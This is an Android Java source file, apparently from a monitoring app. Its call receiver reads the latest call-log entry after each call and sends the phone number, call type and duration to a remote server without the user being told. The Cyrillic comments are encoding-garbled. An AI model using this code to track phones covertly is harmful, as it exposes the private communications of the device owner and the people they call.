package com.inet.android.call;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.concurrent.TimeUnit;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.inet.android.bs.FileLog;
import com.inet.android.bs.Request;
import com.inet.android.bs.WorkTimeDefiner;

public class CallReceiver extends BroadcastReceiver {
	String phoneNumber = "";
	File outFile;
	FileWriter wrt;
	String str = "";
	FileReader fin;
	Context ctx;
	String date;
	SharedPreferences sp;
	private static String LOG_TAG = "callReciver";
	Request req;

	@Override
	public void onReceive(Context arg0, Intent intent) {
		// TODO Auto-generated method stub
		sp = PreferenceManager.getDefaultSharedPreferences(arg0);
		String call = sp.getString("KBD", "0");

		if (call.equals("0")) {
			Log.d(LOG_TAG, "KBD = 0");
			FileLog.writeLog("CallReciver: KBD = 0");
			return;
		}
		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
		if (!isWork) {
			Log.d(LOG_TAG, "isWork return " + Boolean.toString(isWork));
			Log.d(LOG_TAG, "after isWork retrun 0");
			FileLog.writeLog("Callreciver: isWork return "
					+ Boolean.toString(isWork));
			FileLog.writeLog("Callreciver: after isWork retrun 0");

			return;
		} else {
			Log.d(LOG_TAG, Boolean.toString(isWork));
			FileLog.writeLog("Callreciver: isWork - "
					+ Boolean.toString(isWork));
		}

		date = logTime();
		ctx = arg0;

		if (intent.getAction()
				.equals("android.intent.action.NEW_OUTGOING_CALL")) {
			// �������� ��������� �����
		} else if (intent.getAction().equals(
				"android.intent.action.PHONE_STATE")) {
			String phoneState = intent
					.getStringExtra(TelephonyManager.EXTRA_STATE);
			if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
				// ������� ������, �������� �������� �����

			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
				// ������� ��������� � ������ ������ (����� ������ / ��������)
			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
				// ������� ��������� � ������ ������ (������� ��������� ��
				// ��������� ���������,
				// ����� ��� ����� ����� � ���� ������
				try {
					// TimeUnit.SECONDS.sleep(1);
					TimeUnit.MILLISECONDS.sleep(1000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				getCallDetails();
			}
		}
	}

	private void getCallDetails() {

		StringBuffer sb = new StringBuffer();
		Cursor managedCursor = ctx.getContentResolver().query(
				CallLog.Calls.CONTENT_URI, null, null, null, null);

		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		// int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

		sb.append("Call Details :");

		managedCursor.moveToLast();
		String phNumber = managedCursor.getString(number);
		String callType = managedCursor.getString(type);
		// String callDate = managedCursor.getString( date );
		// Date callDayTime = new Date(Long.valueOf(callDate));
		String callDuration = managedCursor.getString(duration);
		if (Integer.parseInt(callDuration) < 30) {
			callDuration = "30";
		}
		String dir = null;
		int dircode = Integer.parseInt(callType);

		switch (dircode) {
		case CallLog.Calls.OUTGOING_TYPE:
			dir = "���. ������";
			break;

		case CallLog.Calls.INCOMING_TYPE:
			dir = "��. ������";
			break;

		case CallLog.Calls.MISSED_TYPE:
			dir = "����������� ������";
			break;
		}

		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir
				+ " \nCall Date:--- " + date + " \nCall duration in sec :--- "
				+ callDuration);
		sb.append("\n----------------------------------");
		managedCursor.close();

		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
				+ "</id><time>" + date + "</time><type>4</type><app>" + dir
				+ "</app><ttl>" + phNumber + "</ttl><ntime>" + callDuration
				+ "</ntime></packet>";
		req = new Request(ctx);
		req.sendRequest(sendStr);

		Log.d("callRec", sb.toString());
		FileLog.writeLog("Callreciver: " + sb.toString());
	}

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}
}